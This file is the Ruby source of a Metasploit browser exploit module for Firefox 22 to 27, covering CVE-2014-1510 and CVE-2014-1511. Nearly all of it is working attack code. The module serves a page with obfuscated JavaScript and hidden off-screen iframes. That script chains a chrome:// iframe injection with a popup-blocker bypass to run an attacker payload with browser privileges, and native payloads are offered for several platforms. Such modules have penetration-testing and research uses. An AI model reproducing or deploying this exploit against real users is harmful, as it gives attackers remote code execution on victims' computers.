# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;rex/exploitation/jsobfu&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
 
  autopwn_info({
    :ua_name    => HttpClients::FF,
    :ua_maxver  => "22.0",
    :ua_maxver  => "27.0",
    :javascript => true,
    :rank       => ExcellentRanking
  })
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Firefox WebIDL Privileged Javascript Injection&#039;,
      &#039;Description&#039;    => %q{
        This exploit gains remote code execution on Firefox 22-27 by abusing two
        separate privilege escalation vulnerabilities in Firefox&#039;s Javascript
        APIs.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039;  => [
        &#039;Marius Mlynski&#039;, # discovery and pwn2own exploit
        &#039;joev&#039; # metasploit module
      ],
      &#039;DisclosureDate&#039; => "Mar 17 2014",
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-1510&#039;], # open chrome:// url in iframe
        [&#039;CVE&#039;, &#039;2014-1511&#039;]  # bypass popup blocker to load bare ChromeWindow
      ],
      &#039;Targets&#039; => [
        [
          &#039;Universal (Javascript XPCOM Shell)&#039;, {
            &#039;Platform&#039; => &#039;firefox&#039;,
            &#039;Arch&#039; => ARCH_FIREFOX
          }
        ],
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ java linux osx solaris win },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;BrowserRequirements&#039; => {
        :source  => &#039;script&#039;,
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(22, 27) }
      }
    ))
 
    register_options([
      OptString.new(&#039;CONTENT&#039;, [ false, "Content to display inside the HTML <body>.", "" ])
    ], self.class)
  end
 
  def on_request_exploit(cli, request, target_info)
    send_response_html(cli, generate_html(target_info))
  end
 
  def generate_html(target_info)
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    frame = Rex::Text.rand_text_alpha(5 + rand(12))
    r = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin
    data_uri = "data:text/html,<script>c = new mozRTCPeerConnection;c.createOffer(function()"+
               "{},function(){top.vvv=window.open(&#039;chrome://browser/content/browser.xul&#039;, "+
               "&#039;#{r}&#039;, &#039;chrome,top=-9999px,left=-9999px,height=100px,width=100px&#039;);})<\/script>"
 
    js = Rex::Exploitation::JSObfu.new(%Q|
      var opts = #{JSON.unparse(opts)};
      var key = opts[&#039;#{key}&#039;];
 
      // Load the chrome-privileged browser XUL script into an iframe
      var c = new mozRTCPeerConnection;
      c.createOffer(function(){},function(){
        window.open(&#039;chrome://browser/content/browser.xul&#039;, &#039;#{frame}&#039;);
        step1();
      });
 
      // Inject a data: URI into an internal frame inside of the browser
      // the new window from being wrapped with browser XUL;
      function step1() {
        var clear = setInterval(function(){
 
          // throws until frames[0].frames[2] is available (when chrome:// iframe loads)
          frames[0].frames[2].location;
 
          // we base64 this to avoid the script tag screwing up things when obfuscated
          frames[0].frames[2].location=window.atob(&#039;#{Rex::Text.encode_base64(data_uri)}&#039;);
          clearInterval(clear);
          setTimeout(step2, 100);
        },10);
      }
 
      // Step 2: load the chrome-level window up with a data URI, which
      // gives us same-origin. Make sure to load an "<iframe mozBrowser>"
      // into the frame, since that will respond to our messageManager
      // (this is important later)
      function step2() {
        var clear = setInterval(function(){
          top.vvv.location = &#039;data:text/html,<html><body><iframe mozBrowser &#039;+
                             &#039;src="about:blank"></iframe></body></html>&#039;;
          clearInterval(clear);
          setTimeout(step3, 100);
        }, 10);
      }
 
      function step3() {
        var clear = setInterval(function(){
          if (!frames[0]) return; // will throw until the frame is accessible
          top.vvv.messageManager.loadFrameScript(&#039;data:,&#039;+key, false);
          clearInterval(clear);
          setTimeout(function(){top.vvv.close();}, 100);
        }, 10);
      }
 
    |)
 
    js.obfuscate
 
    %Q|
      <!doctype html>
      <html>
        <body>
          <iframe id=&#039;#{frame}&#039; name=&#039;#{frame}&#039;
                  style=&#039;position:absolute;left:-9999999px;height:1px;width:1px;&#039;>
          </iframe>
          <script>
            #{js}
          </script>
          #{datastore[&#039;CONTENT&#039;]}
        </body>
      </html>
    |
  end
end

